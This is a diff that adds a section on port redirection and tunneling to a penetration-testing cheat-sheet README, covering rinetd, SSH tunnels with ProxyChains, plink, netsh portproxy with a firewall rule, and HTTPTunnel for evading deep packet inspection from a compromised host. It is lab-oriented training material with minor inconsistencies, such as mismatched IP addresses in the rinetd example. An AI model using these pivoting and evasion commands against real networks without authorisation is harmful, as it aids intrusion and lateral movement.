@@ -148,7 +148,12 @@ EasyG started out as a script that I use to automate some information gathering 
     - [Pass-the-Hash](#pass-the-hash)
   - [Password Cracking](#password-cracking)
     - [John the Ripper](#john-the-ripper)
-
+- [Port Redirection and Tunneling](#port-redirection-and-tunneling)
+  - [Port Forwarding](#port-forwarding)
+  - [SSH Tunneling](#ssh-tunneling)
+  - [Plix.exe](#plixexe)
+  - [Netsh](#netsh)
+  - [HTTPTunnel-ing through Deep Packet Inspection](#httptunnel-ing-through-deep-packet-inspection)
 
 ## Resources
 
@@ -3340,3 +3345,77 @@ Examples of usage:
 - To distribute the load and speed up the cracking process (for multi core CPUs)
   1. Use the options `--fork=8` and `--node=1-8/16` on the first machine
   2. Use the options `--fork=8` and `--node=9-16/16` on the first machine
+
+
+## Port Redirection and Tunneling
+
+**Tools**
+- [rinetd](https://github.com/samhocevar/rinetd)
+- [ProxyChains](https://github.com/haad/proxychains)
+- [Plink.exe](https://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html)
+- [HTTPTunnel](https://github.com/larsbrinkhoff/httptunnel)
+
+### <ins>Port Forwarding</ins>
+
+#### rinetd
+
+1. Edit `/etc/rinetd.conf`, add `0.0.0.0 80 216.58.207.142 80`
+   - This rule states: all traffic received on port `80` of our machine, listening on all interfaces (`0.0.0.0`), regardless of destination address, will be redirected to `104.244.42.129:80`. 
+2. Restart rinetd `sudo service rinetd restart` and confirm that the port is bound `ss -antp | grep "80"`
+
+
+### <ins>SSH Tunneling</ins>
+
+#### SSH Local Port Forwarding
+`ssh -N -L [bind_address:]port:host:hostport [username@address]`
+
+#### SSH Remote Port Forwarding
+`ssh -N -R [bind_address:]port:host:hostport [username@address]`
+
+#### SSH Dynamic Port Forwarding
+1. `ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>`
+2. Now we must somehow direct our reconnaissance and attack tools to use this proxy. This can be done with ProxyChains.
+   - Edit the ProxyChains configuration file `/etc/proxychains.conf` add the SOCKS4 proxy to it (`socks4  127.0.0.1 8080`).
+3. To run the tools through the SOCKS4 proxy, prepend each command with ProxyChains
+   - `sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.223`
+
+
+### <ins>Plix.exe</ins>
+
+`plink.exe -ssh -l tidus -pw hasford -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`
+- `-ssh` connect via SSH
+- `10.11.0.4` to our machine
+- `-l tidus` as the `tidus` user
+- `-pw hasford` using the password `hasford`
+- `-R` to create a remote port forward of `10.11.0.4:1234`
+- `127.0.0.1:3306` to the MySQL port on the Windows target
+
+The first time plink connects to a host, it will attempt to cache the host key in the registry. For this reason, we should pipe the answer to the prompt with the `cmd.exe /c echo y` command. The final result will look like `cmd.exe /c echo y | plink.exe -ssh -l tidus -pw hasford -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`.
+
+### <ins>Netsh</ins>
+
+#### Local port forwarding
+`netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.227`
+- use netsh (`interface`) context to `add` an IPv4-to-IPv4 (`v4tov4`) proxy (`portproxy`)
+- listening on `10.11.0.22` (`listenaddress=10.11.0.22`), port `4455` (`listenport=4455`)
+- that will forward to `192.168.1.227` (`connectaddress=192.168.1.227`), port `445` (`connectport=445`)
+
+#### allow inbound traffic on TCP port 4455
+`netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow`
+
+
+### <ins>HTTPTunnel-ing through Deep Packet Inspection</ins>
+
+Note: HTTPTunnel uses both a client (`htc`) and a server (`hts`)
+
+1. To begin building our tunnel, create a local SSH-based port forward between the compromised Linux machine and the Windows remote desktop target
+   - `ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1`
+   - `ss -antp | grep "8888"`
+2. Create an HTTPTunnel out to our Attacker Linux machine in order to slip our traffic past the HTTP-only protocol restriction
+   - `hts --forward-port localhost:8888 1234`
+   - `ps aux | grep hts`
+   - `ss -antp | grep "1234"`
+3. We need an HTTPTunnel client that will take our remote desktop traffic, encapsulate it into an HTTP stream, and send it to the listening HTTPTunnel server
+   - `htc --forward-port 8080 10.11.0.128:1234`
+   - `ps aux | grep htc`
+   - `ss -antp | grep "8080"`
